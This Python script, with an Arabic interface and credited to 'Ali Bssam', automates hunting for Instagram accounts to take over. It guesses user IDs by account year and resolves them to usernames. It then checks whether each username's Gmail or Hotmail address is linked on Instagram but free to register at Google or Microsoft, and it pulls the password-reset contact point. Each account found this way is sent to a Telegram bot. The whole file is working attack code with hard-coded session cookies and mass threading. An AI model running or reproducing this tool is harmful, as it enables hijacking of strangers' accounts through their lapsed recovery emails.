import random
import os
import sys
import time
import re
import string
import json
import secrets
from threading import Thread, Lock

# محاولة استيراد المكتبات المطلوبة، مع تثبيتها تلقائياً إذا لم تكن موجودة
required_packages = {
    'colorama': 'colorama',
    'requests': 'requests',
    'user_agent': 'user-agent',
    'httpx': 'httpx'
}

for package, install_name in required_packages.items():
    try:
        __import__(package)
    except ImportError:
        os.system(f'pip install {install_name}')
        __import__(package)

import colorama
from colorama import Fore, Back, Style
import requests
import httpx
from user_agent import generate_user_agent as gg

# تهيئة colorama
colorama.init(autoreset=True)

# ==================== تعريفات الألوان والأنماط ====================
class Colors:
    HEADER = Fore.MAGENTA + Style.BRIGHT
    INFO = Fore.CYAN
    SUCCESS = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW
    FAIL = Fore.RED
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
    BG_BLUE = Back.BLUE
    BG_GREEN = Back.GREEN
    BG_CYAN = Back.CYAN
    BG_YELLOW = Back.YELLOW

ICONS = {
    'GENERATED': '🔄',
    'INSTAGRAM': '📷',
    'GMAIL': '📧',
    'HOTMAIL': '📨',
    'TAKEN': '❌',
    'AVAILABLE': '✅',
    'ERROR': '⚠️',
    'SENT': '📤',
    'TIME': '⏱️',
    'WARNING': '⚠️',
    'INFO': 'ℹ️',
    'STOP': '🛑',
    'SUCCESS': '✔️',
    'CONTACT': '📞',
}

# ==================== العدادات العامة ====================
total_generated = 0
instagram_taken = 0
instagram_not_taken = 0
google_available = 0
google_unavailable = 0
google_errors = 0
hotmail_checked = 0
hotmail_available = 0
hotmail_unavailable = 0
hotmail_errors = 0
valid_hits_gmail = 0
valid_hits_hotmail = 0
counters_lock = Lock()

# ==================== إعدادات التيليجرام ====================
def get_telegram_config():
    print(f"\n{Colors.BG_BLUE}{Colors.BOLD} {ICONS['INFO']} إعدادات التيليجرام {ICONS['INFO']} {Colors.RESET}")
    print(f"{Colors.INFO}{'─'*50}{Colors.RESET}")
    bot_token = input(f"{Colors.BOLD}أدخل توكن البوت (Bot Token): {Colors.RESET}").strip()
    chat_id = input(f"{Colors.BOLD}أدخل معرف الدردشة (Chat ID): {Colors.RESET}").strip()
    return bot_token, chat_id

BOT_TOKEN, CHAT_ID = get_telegram_config()

# ==================== الثوابت ====================
GMAIL_DOMAIN = "@gmail.com"
HOTMAIL_DOMAIN = "@hotmail.com"
THREADS = 20

# ==================== دالة تقدير سنة الإنشاء ====================
def estimate_creation_date(pk_id):
    try:
        hy = int(pk_id) if pk_id else 0
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        if hy > 21254029834:
            if hy <= 30577684866:
                return 2020
            elif hy <= 48009087498:
                return 2021
            elif hy <= 51994527687:
                return 2022
            else:
                return 2023
    except Exception:
        return None

# ==================== قائمة اختيار السنوات ====================
def show_year_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Colors.HEADER}
╔════════════════════════════════════════════════════════════╗
║           إنستغرام → جيميل / هوتميل  فاليديتور             ║
║                    الإصدار 2026 المحسن                      ║
╚════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)
    print(f"{Colors.BG_CYAN}{Colors.BOLD} {ICONS['TIME']} اختيار سنة الصيد {ICONS['TIME']} {Colors.RESET}\n")
    
    year_options = {
        1: 2010, 2: 2011, 3: 2012, 4: 2013, 5: 2014,
        6: 2015, 7: 2016, 8: 2017, 9: 2018, 10: 2019,
        11: 2020, 12: 2021, 13: 2022, 14: 2023
    }
    
    print(f"{Colors.BOLD}السنوات المتاحة:{Colors.RESET}")
    for i in range(1, 15, 4):
        line = "   ".join([f"[{j:2d}] {year_options[j]}" for j in range(i, min(i+4, 15)) if j in year_options])
        print(f"   {line}")
    
    print(f"\n{Colors.WARNING}{ICONS['INFO']} يمكنك اختيار أكثر من رقم (مثال: 1,3,5-8,14) أو 'all' لجميع السنوات.{Colors.RESET}")
    
    while True:
        choice = input(f"\n{Colors.BOLD}{ICONS['TIME']} اختيارك: {Colors.RESET}").strip().lower()
        
        if choice == 'all':
            selected = list(year_options.values())
            break
        
        selected_years = set()
        parts = choice.split(',')
        valid = True
        for part in parts:
            part = part.strip()
            if '-' in part:
                try:
                    start, end = map(int, part.split('-'))
                    for num in range(start, end + 1):
                        if 1 <= num <= 14:
                            selected_years.add(year_options[num])
                        else:
                            print(f"{Colors.FAIL}⚠ الرقم {num} خارج النطاق (1-14){Colors.RESET}")
                            valid = False
                except:
                    print(f"{Colors.FAIL}⚠ صيغة نطاق غير صحيحة: {part}{Colors.RESET}")
                    valid = False
            else:
                try:
                    num = int(part)
                    if 1 <= num <= 14:
                        selected_years.add(year_options[num])
                    else:
                        print(f"{Colors.FAIL}⚠ الرقم {num} خارج النطاق (1-14){Colors.RESET}")
                        valid = False
                except ValueError:
                    print(f"{Colors.FAIL}⚠ إدخال غير صحيح: {part}{Colors.RESET}")
                    valid = False
        
        if valid and selected_years:
            selected = sorted(selected_years)
            break
        else:
            print(f"{Colors.WARNING}❌ لم تختر أي سنة صحيحة، حاول مرة أخرى.{Colors.RESET}")
    
    print(f"\n{Colors.SUCCESS}{ICONS['SUCCESS']} تم اختيار السنوات: {selected}{Colors.RESET}")
    return selected

# ==================== نطاقات PK ID ====================
def get_pk_range_for_year(year):
    ranges = [
        (2010, 0, 1279000),
        (2011, 1279001, 17750000),
        (2012, 17750001, 279760000),
        (2013, 279760001, 900990000),
        (2014, 900990001, 1629010000),
        (2015, 1629010001, 2500000000),
        (2016, 2500000001, 3713668786),
        (2017, 3713668787, 5699785217),
        (2018, 5699785218, 8597939245),
        (2019, 8597939246, 21254029834),
        (2020, 21254029835, 30577684866),
        (2021, 30577684867, 48009087498),
        (2022, 48009087499, 51994527687),
        (2023, 51994527688, 10**12)
    ]
    for y, low, high in ranges:
        if y == year:
            return low, high
    return None, None

def generate_random_pk_for_year(year):
    low, high = get_pk_range_for_year(year)
    if low is None or high is None:
        return None
    return random.randint(low, high)

# ==================== توليد اسم مستخدم عبر GraphQL ====================
def generate_username(pk_id):
    try:
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
        user_id = str(pk_id)
        variables = json.dumps({"id": user_id, "render_surface": "PROFILE"})
        data = {
            "lsd": lsd,
            "variables": variables,
            "doc_id": "25618261841150840"
        }
        response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": lsd},
            data=data,
            timeout=10
        )
        response.raise_for_status()
        username = response.json()['data']['user']['username']
        return username
    except Exception:
        return None

# ==================== جلب نقطة الاتصال (Reest) ====================
def get_contact_point(identifier):
    """
    ترسل طلب إلى Instagram للكشف عن البريد الإلكتروني أو رقم الهاتف المرتبط بالحساب.
    :param identifier: اسم المستخدم أو البريد الإلكتروني
    :return: قاموس يحتوي على نتيجة العملية
    """
    try:
        headers = {
            "user-agent": gg(),
            "x-ig-app-id": "936619743392459",
            "x-requested-with": "XMLHttpRequest",
            "x-instagram-ajax": "1032099486",
            "x-csrftoken": "missing",
            "x-asbd-id": "359341",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/password/reset/",
            "accept-language": "en-US",
            "priority": "u=1, i",
        }
        # استخدام httpx مع HTTP/2
        with httpx.Client(http2=True, headers=headers, timeout=20) as client:
            response = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": identifier}
            )
            data = response.json()
            contact = data.get("contact_point", None)
            if contact:
                return {"success": True, "contact": contact}
            else:
                return {"success": False, "error": "لم يتم العثور على نقطة اتصال"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ==================== جلب إحصائيات إنستغرام ====================
def get_instagram_stats(username):
    url = f"https://www.instagram.com/{username}/"
    headers = {'User-Agent': gg()}
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code != 200:
            return None, None, None
        
        pattern = r'<meta\s+property="og:description"\s+content="([^"]+)"'
        match = re.search(pattern, resp.text)
        
        pk_patterns = [
            r'"user_id":"(\d+)"',
            r'"id":"(\d+)"',
            r'"pk":(\d+)',
            r'"profilePage_(\d+)"'
        ]
        
        pk_id = None
        for p in pk_patterns:
            pk_match = re.search(p, resp.text)
            if pk_match:
                pk_id = pk_match.group(1)
                break
        
        if match:
            desc = match.group(1)
            parts = desc.split(',')
            followers_str = parts[0].strip() if len(parts) > 0 else ''
            following_str = parts[1].strip() if len(parts) > 1 else ''
            
            followers_num = re.search(r'([\d.,]+k?)\s*Followers', followers_str, re.IGNORECASE)
            following_num = re.search(r'([\d.,]+k?)\s*Following', following_str, re.IGNORECASE)
            
            followers = followers_num.group(1) if followers_num else 'N/A'
            following = following_num.group(1) if following_num else 'N/A'
            return followers, following, pk_id
        else:
            return None, None, pk_id
    except Exception:
        return None, None, None

# ==================== إرسال إلى التيليجرام (مع Rest) ====================
def send_to_telegram(email, username, followers, following, creation_year, contact_info=None, source="Gmail"):
    profile_url = f"https://www.instagram.com/{username}/"
    year_str = str(creation_year) if creation_year else "Unknown"
    contact_str = f"\n✅Rest {contact_info}" if contact_info else ""
    
    message = f"""
{ICONS['INSTAGRAM']} <b>ACCOUNT INFO ({source})</b> {ICONS['INSTAGRAM']}
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>User:</b> {username}
📧 <b>Mail:</b> {email}
🔗 <b>URL:</b> {profile_url}
📅 <b>Est. Year:</b> {year_str}
👥 <b>Followers:</b> {followers}{contact_str}
━━━━━━━━━━━━━━━━━━━━━
✅ Ali BssaM @as_wqt
"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=payload, timeout=5)
        print(f"{Colors.SUCCESS}{ICONS['SENT']} تم إرسال {source}: {username} (سنة: {year_str}){Colors.RESET}")
    except Exception as e:
        print(f"{Colors.FAIL}{ICONS['ERROR']} فشل إرسال التيليجرام: {e}{Colors.RESET}")

# ==================== فحص البريد في إنستغرام ====================
def insta_check(email):
    headers = {
        'X-Csrftoken': secrets.token_hex(16),
        'User-Agent': gg(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/accounts/signup/email/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    try:
        res = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/check_email/',
            headers=headers,
            data={'email': email},
            timeout=10
        ).text
        return "email_is_taken" in res
    except:
        return False

# ==================== فحص جوجل ====================
def get_google_tokens():
    try:
        yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(yy) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(yy) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(yy) for _ in range(random.randrange(15, 30)))
        
        headers = {"google-accounts-xsrf": "1", "user-agent": gg()}
        res = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&hl=en-GB', headers=headers, timeout=10)
        tok_search = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res.text)
        
        if not tok_search:
            return None, None
        tok = tok_search.group(2)
        
        validate_data = {
            'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=validate_data,
            timeout=10
        )
        
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        new_host = response.cookies.get_dict().get('__Host-GAPS', host)
        return tl, new_host
    except Exception:
        return None, None

def google_check(username):
    tl, host = get_google_tokens()
    if not tl:
        return None
    
    try:
        headers = {
            'authority': 'accounts.google.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': gg(),
        }
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        response = requests.post(
            f'https://accounts.google.com/_/signup/usernameavailability?TL={tl}',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=data,
            timeout=10
        )
        
        if '"gf.uar",1' in response.text:
            return True
        else:
            return False
    except:
        return None

# ==================== فحص هوتميل ====================
def hotmail_check(email):
    cookies = {
        'mkt': 'ar-IQ',
        'MUID': '2fc04acacf164e8cbd0baed54a22ca99',
        '_pxvid': '19205b6f-8227-11f0-881a-4a42e45557f1',
        'MSFPC': 'GUID=dcf26da31c7c4a03a73757c9b479b8ca&HASH=dcf2&LV=202508&V=4&LU=1756176470670',
        'mkt1': 'ar-IQ',
        'amsc': 'NPA7phXOEYghGfeTqjktYz2iDY0rRoXPJyT+bCq2bxZS+jO/aZLrYsYWMLS4uBYxaI3FFgDGekg9ShZz/Q60GS9jwDr3czEWx672Uam5vToDuI6CwtiqbNdqBlfWy06KUVdFdXzDmhl9fb6v5zOG3o6Wn97kZcaQYCJhr55FYsfBpe2xgr2mnuaySqYXS+rVabjsEkYH+tnftNOR6z/L28n/FsVWhzAi+is7bPK3Nx/FHaj91D2OwnKKc049IUup0W6mz/jsVj2dhtG6wkHbjuwopl2l/118KL1DV9bcx2/UNVhSlioYLhdTNAXnvNSJ:2:3c',
        'fptctx2': 'taBcrIH61PuCVH7eNCyH0J9Fjk1kZEyRnBbpUW3FKs8CBOnCX6UyrBG5j%252ffv3Q6CXOw%252bUsl1TlgXb%252fZEpaCMY%252f6SLqjw8g7s85ijR3s32D7ZaxSqsjZwzx3a0LzAD8EKfww47hJdf88zA5JHC8x1fH8%252f7VPGXjdH%252fT1k6h9hoQt%252bYJIgmS0BiGNPB3n6le2u2I4lWHgZV7xEKXR0e%252fe0zPYGdghTCjehgMVKQRFm2igirAEHFOirM4ZvINo7HeGfFecLAvUXOGG%252fR7211QFPLkAtsFySAY%252fa37xd1%252b%252fsfKCjGbK8gSx2epqBbXskTgkSBiB9WrwFU5qyiOTO%252biRUrA%253d%253d',
        '_px3': 'fb56022babd210a7161d6c9be5796f9e17d3828a6b8c89589c96539a3700f074:Q90KV+tdepu7cs6Y51Vtcl9SBojp5q9c1Yg3AUY3A6iTMardNRBdHvS3XdXtX/9lBquHnmI40yZv0AMSsDv2lg==:1000:ER3jf/IZKDBWwOVSUKg4DKpTG+NhqGN4eiVIyWzySUi0EQP+NEV5KZ11nnm4VvEJMDRYZ5BYJOoYSzvuYltuve4x3AzS9B8xNPDBlKAcKF60uiyoSi/hPsKpM2sZAmIDEojRwFerdl67TgtnFO3Hp0jE5yqm70GYimL3ijZkDLbeztgKuIgbfn9aF7QHwQ4Qi9iBjlEffzzegD0pqNcjCzqYfz9UX+L27olgiKxao1O7deqezSDBMVn8WAjgX0LEMW6XJFsY8+HIJV3A/fNxEAZClc7xUG5/9gXcP8hJLuQNuqbZa+CGI8CLuPXeufk49oe/9BJGUzF6gd4Ss3vYkAdTwVKowinU5fftOyYhHSPwPOfF7f5eWfucSxJYol58bDhSiMNjD+2fbdxvKhfp2gX1SBnnH7RrwRbf+n8d6tam5VHjaEUY/hbAjPirBI4w1Av48vDyqJ6fIuKJawYnPo13eYFuq8fz+MzmTY2fqhQ=',
        '_pxde': 'b35902d77c4e155823c9b012594933175bb68377f92ebfbb021b8c0ca3d78127:eyJ0aW1lc3RhbXAiOjE3NzI2MDE4ODQ0MjYsImZfa2IiOjAsImluY19pZCI6WyI2YThiNDBjYjdkYTU5MWY1NDY3MTJkODlhMzFkMjE2NiJdfQ==',
    }

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=utf-8',
        'Origin': 'https://signup.live.com',
        'Referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d2049%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dAR-IQ%26opid%3d2C3BDE81B9997903%26opidt%3d1772559638%26uaid%3db527ff1485b3963e8bc77145c8f1f1cb%26contextid%3d0122DCF027042318%26opignore%3d1&mkt=AR-IQ&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=b527ff1485b3963e8bc77145c8f1f1cb&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'canary': 'KEW+V/pMtHGc9vIUcHKmVCU0lGpcKmzfVJceh833Nt+nIoJFKsNP1xOW74Qc9eiI+dznX5+d5tId3XUKWDmeOfux6EnZOgvFOGlO6TFAwNALbXjZ4wYM7EUa5DKVVuxu89szkq6eOebwXPJy4N+a5DISxLqvhChOI2P5PmEgbLnCp6vbyCT/XHA1o5b/vN5v1YZy6qsqm0YlMW5qJR4zNP59f+Gy5c1KXWBO6eDAHy7phu6P/44waqI8gjDl/ZR3:2:3c',
        'client-request-id': 'b527ff1485b3963e8bc77145c8f1f1cb',
        'correlationId': 'b527ff1485b3963e8bc77145c8f1f1cb',
        'hpgact': '0',
        'hpgid': '200225',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
    }

    json_data = {
        'includeSuggestions': True,
        'signInName': email,
        'uiflvr': 1001,
        'scid': 100118,
        'uaid': 'b527ff1485b3963e8bc77145c8f1f1cb',
        'hpgid': 200225,
    }

    url = 'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d2049%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dAR-IQ%26opid%3d2C3BDE81B9997903%26opidt%3d1772559638%26uaid%3db527ff1485b3963e8bc77145c8f1f1cb%26contextid%3d0122DCF027042318%26opignore%3d1&mkt=AR-IQ&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=b527ff1485b3963e8bc77145c8f1f1cb&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1'

    try:
        response = requests.post(url, cookies=cookies, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()
        data = response.json()
        if 'isAvailable' in data:
            if data['isAvailable']:
                return False
            else:
                return True
        else:
            return None
    except Exception:
        return None

# ==================== شاشة الحالة ====================
def status_display(selected_years):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Colors.HEADER}")
        print("╔════════════════════════════════════════════════════════════╗")
        print("║        إنستغرام → جيميل / هوتميل فاليديتور 2026           ║")
        print("╚════════════════════════════════════════════════════════════╝")
        print(f"{Colors.RESET}")
        
        with counters_lock:
            print(f"{Colors.BG_BLUE}{Colors.BOLD} 📊 الإحصائيات العامة {Colors.RESET}")
            print(f"{Colors.INFO}{'─'*60}{Colors.RESET}")
            print(f" {ICONS['GENERATED']} أسماء مستخدمين مولدة: {Colors.BOLD}{total_generated}{Colors.RESET}")
            print(f" {ICONS['INSTAGRAM']} تم فحص إنستغرام: {Colors.BOLD}{instagram_taken + instagram_not_taken}{Colors.RESET}")
            print(f"   {ICONS['TAKEN']} مسجل في إنستغرام: {Colors.WARNING}{instagram_taken}{Colors.RESET}")
            print(f"   {ICONS['AVAILABLE']} غير مسجل: {Colors.SUCCESS}{instagram_not_taken}{Colors.RESET}")
            
            print(f"\n{Colors.BG_GREEN}{Colors.BOLD} 🔍 فحص جوجل (لحسابات Gmail المسجلة في إنستغرام) {Colors.RESET}")
            print(f"   {ICONS['AVAILABLE']} متاح في جوجل: {Colors.SUCCESS}{google_available}{Colors.RESET}")
            print(f"   {ICONS['TAKEN']} مأخوذ في جوجل: {Colors.WARNING}{google_unavailable}{Colors.RESET}")
            print(f"   {ICONS['ERROR']} أخطاء: {Colors.FAIL}{google_errors}{Colors.RESET}")
            
            print(f"\n{Colors.BG_CYAN}{Colors.BOLD} 📧 فحص هوتميل (لحسابات Hotmail المسجلة في إنستغرام) {Colors.RESET}")
            print(f"   {ICONS['INFO']} تم الفحص: {hotmail_checked}")
            print(f"   {ICONS['AVAILABLE']} متاح في هوتميل: {Colors.SUCCESS}{hotmail_available}{Colors.RESET}")
            print(f"   {ICONS['TAKEN']} مأخوذ في هوتميل: {Colors.WARNING}{hotmail_unavailable}{Colors.RESET}")
            print(f"   {ICONS['ERROR']} أخطاء: {Colors.FAIL}{hotmail_errors}{Colors.RESET}")
            
            print(f"\n{Colors.BG_YELLOW}{Colors.BOLD} 💾 الإرسال إلى التيليجرام (جميع الحسابات مع Rest إن وجد) {Colors.RESET}")
            print(f"   {ICONS['GMAIL']} Gmail: {Colors.SUCCESS}{valid_hits_gmail}{Colors.RESET}")
            print(f"   {ICONS['HOTMAIL']} Hotmail: {Colors.SUCCESS}{valid_hits_hotmail}{Colors.RESET}")
        
        print(f"\n{Colors.WARNING}{ICONS['INFO']} سنوات العرض المختارة: {selected_years}{Colors.RESET}")
        print(f"{Colors.WARNING}{ICONS['STOP']} اضغط Ctrl+C للإيقاف - النتائج محفوظة في ملفات .txt{Colors.RESET}")
        print(f"{Colors.INFO}{'─'*60}{Colors.RESET}")
        time.sleep(1.5)

# ==================== العامل الرئيسي (worker) ====================
def worker(selected_years):
    global total_generated, instagram_taken, instagram_not_taken
    global google_available, google_unavailable, google_errors
    global hotmail_checked, hotmail_available, hotmail_unavailable, hotmail_errors
    global valid_hits_gmail, valid_hits_hotmail
    
    while True:
        year = random.choice(selected_years)
        pk_id = generate_random_pk_for_year(year)
        if not pk_id:
            time.sleep(0.5)
            continue
        
        username = generate_username(pk_id)
        if not username:
            time.sleep(0.5)
            continue
        
        with counters_lock:
            total_generated += 1
        
        if '_' in username:
            continue
        
        # فحص Gmail أولاً
        gmail_email = username + GMAIL_DOMAIN
        ig_registered_gmail = insta_check(gmail_email)
        
        if ig_registered_gmail:
            with counters_lock:
                instagram_taken += 1
            
            google_status = google_check(username)
            if google_status is True:
                with counters_lock:
                    google_available += 1
                
                followers, following, pk_id_from_page = get_instagram_stats(username)
                followers = followers if followers else 'N/A'
                creation_year = estimate_creation_date(pk_id_from_page) if pk_id_from_page else None
                
                # محاولة الحصول على معلومات Rest
                contact_result = get_contact_point(username)
                contact_info = contact_result.get('contact') if contact_result['success'] else None
                
                # إرسال إلى التيليجرام (دون فلترة)
                send_to_telegram(gmail_email, username, followers, following, creation_year, contact_info, source="Gmail")
                with counters_lock:
                    valid_hits_gmail += 1
                with open("valid_accounts.txt", "a", encoding='utf-8') as f:
                    f.write(f"{gmail_email} | Year: {creation_year} | Followers: {followers} | PK: {pk_id_from_page} | Contact: {contact_info}\n")
                
                year_status = f"(سنة {creation_year})"
                if creation_year and creation_year in selected_years:
                    print(f"{Colors.SUCCESS}{ICONS['AVAILABLE']} Gmail صيد: {gmail_email} {year_status}{Colors.RESET}")
                else:
                    print(f"{Colors.WARNING}{ICONS['AVAILABLE']} Gmail صيد: {gmail_email} {year_status} (خارج المختارة){Colors.RESET}")
            
            elif google_status is False:
                with counters_lock:
                    google_unavailable += 1
                print(f"{Colors.WARNING}{ICONS['TAKEN']} Gmail مسجل في جوجل: {gmail_email}{Colors.RESET}")
            else:
                with counters_lock:
                    google_errors += 1
                print(f"{Colors.FAIL}{ICONS['ERROR']} فشل فحص جوجل: {gmail_email}{Colors.RESET}")
        
        else:  # Gmail غير مسجل → ننتقل لهوتميل
            with counters_lock:
                instagram_not_taken += 1
            print(f"{Colors.INFO}{ICONS['INSTAGRAM']} Gmail غير مسجل في إنستغرام: {gmail_email}{Colors.RESET}")
            
            hotmail_email = username + HOTMAIL_DOMAIN
            ig_registered_hotmail = insta_check(hotmail_email)
            
            if ig_registered_hotmail:
                with counters_lock:
                    instagram_taken += 1
                    hotmail_checked += 1
                
                hotmail_status = hotmail_check(hotmail_email)
                
                if hotmail_status is False:
                    with counters_lock:
                        hotmail_available += 1
                    
                    followers, following, pk_id_from_page = get_instagram_stats(username)
                    followers = followers if followers else 'N/A'
                    creation_year = estimate_creation_date(pk_id_from_page) if pk_id_from_page else None
                    
                    # محاولة الحصول على معلومات Rest
                    contact_result = get_contact_point(username)
                    contact_info = contact_result.get('contact') if contact_result['success'] else None
                    
                    # إرسال إلى التيليجرام (دون فلترة)
                    send_to_telegram(hotmail_email, username, followers, following, creation_year, contact_info, source="Hotmail")
                    with counters_lock:
                        valid_hits_hotmail += 1
                    with open("valid_hotmail_accounts.txt", "a", encoding='utf-8') as f:
                        f.write(f"{hotmail_email} | Year: {creation_year} | Followers: {followers} | PK: {pk_id_from_page} | Contact: {contact_info}\n")
                    
                    year_status = f"(سنة {creation_year})"
                    if creation_year and creation_year in selected_years:
                        print(f"{Colors.SUCCESS}{ICONS['AVAILABLE']} Hotmail صيد: {hotmail_email} {year_status}{Colors.RESET}")
                    else:
                        print(f"{Colors.WARNING}{ICONS['AVAILABLE']} Hotmail صيد: {hotmail_email} {year_status} (خارج المختارة){Colors.RESET}")
                
                elif hotmail_status is True:
                    with counters_lock:
                        hotmail_unavailable += 1
                    print(f"{Colors.WARNING}{ICONS['TAKEN']} Hotmail مسجل في هوتميل: {hotmail_email}{Colors.RESET}")
                else:
                    with counters_lock:
                        hotmail_errors += 1
                    print(f"{Colors.FAIL}{ICONS['ERROR']} فشل فحص هوتميل: {hotmail_email}{Colors.RESET}")
            else:
                print(f"{Colors.INFO}{ICONS['INSTAGRAM']} Hotmail غير مسجل في إنستغرام: {hotmail_email}{Colors.RESET}")

# ==================== الدالة الرئيسية ====================
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Colors.HEADER}
╔════════════════════════════════════════════════════════════╗
║               إنستغرام → جيميل / هوتميل                    ║
║                     فاليديتور 2026                         ║
║                   مطور بواسطة Ali Bssam                    ║
╚════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)
    time.sleep(1)
    
    selected_years = show_year_menu()
    
    print(f"\n{Colors.SUCCESS}{ICONS['SUCCESS']} جاري بدء {THREADS} عاملاً...{Colors.RESET}")
    print(f"{Colors.WARNING}{ICONS['INFO']} سيتم إرسال جميع الحسابات إلى التيليجرام مع معلومات Rest إن وجدت.{Colors.RESET}\n")
    
    status_thread = Thread(target=status_display, args=(selected_years,), daemon=True)
    status_thread.start()
    
    workers = []
    for _ in range(THREADS):
        t = Thread(target=worker, args=(selected_years,), daemon=True)
        t.start()
        workers.append(t)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.FAIL}{ICONS['STOP']} تم الإيقاف بواسطة المستخدم. يتم حفظ الإحصائيات...{Colors.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()
